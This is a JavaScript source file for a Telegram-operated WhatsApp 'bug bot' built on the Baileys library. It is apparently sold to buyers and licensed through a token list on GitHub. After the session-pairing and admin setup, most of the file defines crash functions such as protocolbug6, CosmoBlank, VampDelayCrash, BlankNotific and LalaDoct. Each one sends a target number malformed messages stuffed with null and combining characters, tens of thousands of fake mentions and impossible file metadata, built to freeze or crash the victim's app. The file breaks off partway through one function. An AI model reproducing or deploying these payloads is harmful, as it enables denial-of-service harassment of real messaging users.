const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./seting меню/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/Ryu2ndk/Ryuu/refs/heads/main/token.json";
const ONLY_FILE = "GrupOnly.json";
const cd = "Cooldown.json";

// ----------------- ( Pengecekan Tokens ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(
    chalk.blue(`
   ⚠️ НУЖНА ПРОВЕРКА ТОКЕНА ⚠️
   CHECK YOUR TOKEN PLEASE WAIT..
`)
  );

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(
      chalk.red.bold(`

  ⚠️ НУЖНА ПРОВЕРКА ТОКЕНА ⚠️
 🔴 YOUR TOKEN IS NOT IN THE DATABSE
`)
    );
    process.exit(1);
  }
  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

function startBot() {
  console.log(
    chalk.bold.green(`

██████╗░██╗░░░██╗██╗░░░██╗██╗░█████╗░██╗░░██╗██╗
██╔══██╗╚██╗░██╔╝██║░░░██║██║██╔══██╗██║░░██║██║
██████╔╝░╚████╔╝░██║░░░██║██║██║░░╚═╝███████║██║
██╔══██╗░░╚██╔╝░░██║░░░██║██║██║░░██╗██╔══██║██║
██║░░██║░░░██║░░░╚██████╔╝██║╚█████╔╝██║░░██║██║
╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                     
   Author : —͟͞Ryuichi
   Telegram Owner: @xmryuu
   Channel : @ryunidekk
   Support : All Buyer Viscount ( You ) 
   Versions : 3.0
   Language : nodeJS
═══════════════════════════════════════════
        ✡ SELAMAT DATANG ✡ 
═══════════════════════════════════════════
`)
  );

  console.log(
    chalk.greenBright(`
`)
  );

  console.log(
    chalk.blueBright(`
`)
  );
}

validateToken();

// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let Ryuu;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  Ryuu = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  Ryuu.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, Ryuu);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  Ryuu.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`

 Sedang Menautkan
  📤 Nomor : ${botNumber}              
 ─────────────────────────
  📈 Status : Loading...                  
 ─────────────────────────
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  Ryuu = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  Ryuu.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
  Menghubungkan      
  📤 Nomor  : ${botNumber}              
 ───────────────────────────
  📈 Status : Menghubungkan...                  
 ───────────────────────────
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
 Eror Saat Mendapatkan Kode
  📤 Nomor  : ${botNumber}              
 ───────────────────────────
  📈 Status : ⚠️EROR CONNECT...                  
 ───────────────────────────
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, Ryuu);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`
        
 Sedang Membuka Koneksi Whatsapp    
  📤 Nomor  : ${botNumber}              
 ───────────────────────────
  📈 Statuz : SUCCES PAIRING               
 ───────────────────────────
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await Ryuu.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
\`\`\`
  Berhasil Mendapatkan Kode
  📤 ЧИСЛО  : ${botNumber}              
 ───────────────────────────
  📈 СТАТУС : ${formattedCode}         
 ───────────────────────────
\`\`\`

`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "Markdown",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`
 Eror Saat Mendapatkan Kode
  📤 Nomor  : ${botNumber}              
 ───────────────────────────
  📈 Eror : ${error.message} #EROR         
 ───────────────────────────
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  Ryuu.ev.on("creds.update", saveCreds);

  return Ryuu;
}

// --------------------- ( Bot Setting ) ---------------------- \\

function isGroupOnly() {
  if (!fs.existsSync(ONLY_FILE)) return false;
  const data = JSON.parse(fs.readFileSync(ONLY_FILE));
  return data.groupOnly;
}

function setGroupOnly(status) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
}

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
let premiumUsers = JSON.parse(fs.readFileSync("./All/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./All/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./All/premium.json");
ensureFileExists("./All/admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./All/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./All/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./All/premium.json", (data) => (premiumUsers = data));
watchFile("./All/admin.json", (data) => (adminUsers = data));

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getRandomImage() {
  const images = ["https://h.uguu.se/gFWyErOo.mp4"];
  return images[Math.floor(Math.random() * images.length)];
}

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}


// ------------------ ( Bugs Function) ------------------------ \\
async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "#RyuNeedLoves",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "trigger newsletter ( @tamainfinity )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Ryuu.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
  }
}

async function CosmoBlank(target, ptcp = true) {
  const Ryuu = `_*~@8~*_\n`.repeat(10500);
  const Love = 'ꦽ'.repeat(55555);

  await Ryuu.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Ultimate' + Love + Ryuu,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function VampDelayCrash(target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Ryuu.cloud.net" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await Ryuu.relayMessage(target, message, { participant: { jid: target } });
}

async function BlankNotific(target) {
			await Ryuu.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "Heaven" + "\u0000" + "ꦽ".repeat(120000),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		}

async function LalaDoct(target) {
                   await Ryuu.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "Open VCS",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(50000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "Open VCS",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "120363404154098043@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "120363404154098043@newsletter",
                                                                   groupSubject: "Open VCS"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By Viscount");
           }

async function VampPrivateBlank(target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '(#)- Xui Crash Viscount...' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
